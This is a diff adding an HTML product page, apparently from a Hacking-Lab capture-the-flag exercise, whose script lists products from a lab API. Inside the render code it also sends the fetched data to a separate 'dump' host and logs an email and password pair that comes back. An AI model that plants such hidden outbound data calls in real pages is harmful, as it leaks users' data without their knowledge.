@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Glocken Emil's Product API</title>
+</head>
+
+<body>
+    <div id="root">
+        <h1>Glocken Emil's Product API</h1>
+    </div>
+    <script>
+        const app = document.getElementById('root');
+        const container = document.createElement('div');
+        app.appendChild(container);
+        var request = new XMLHttpRequest();
+        request.open('GET', 'https://eb47760f26cd.i.hacking-lab.com/api/product', true);
+        request.onload = function () {
+            var data = JSON.parse(this.response);
+            data = data.data.products;
+
+            var xhr = new XMLHttpRequest();
+            var url = "https://dump.idocker.hacking-lab.com/url?data=" + encodeURIComponent(JSON.stringify(data));
+            xhr.open("GET", url, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    var json = JSON.parse(xhr.responseText);
+                    console.log(json.email + ", " + json.password);
+                }
+            };
+            xhr.send();
+
+            if (request.status >= 200 && request.status < 400) {
+                data.forEach(product => {
+                    const card = document.createElement('div');
+                    const h3 = document.createElement('h3');
+                    const p1 = document.createElement('p');
+                    const p2 = document.createElement('p');
+                    const p3 = document.createElement('p');
+                    h3.textContent = product.name;
+                    p1.textContent = "Category: " + product.category.name;
+                    p2.textContent = "Price: " + product.price;
+                    p3.textContent = "Size: " + product.size;
+                    container.appendChild(card);
+                    card.appendChild(h3);
+                    card.appendChild(p1);
+                    card.appendChild(p2);
+                    card.appendChild(p3);
+                });
+            }
+        }
+
+        request.send(); 
+
+
+
+    </script>
+</body>
+
+</html>
+
+
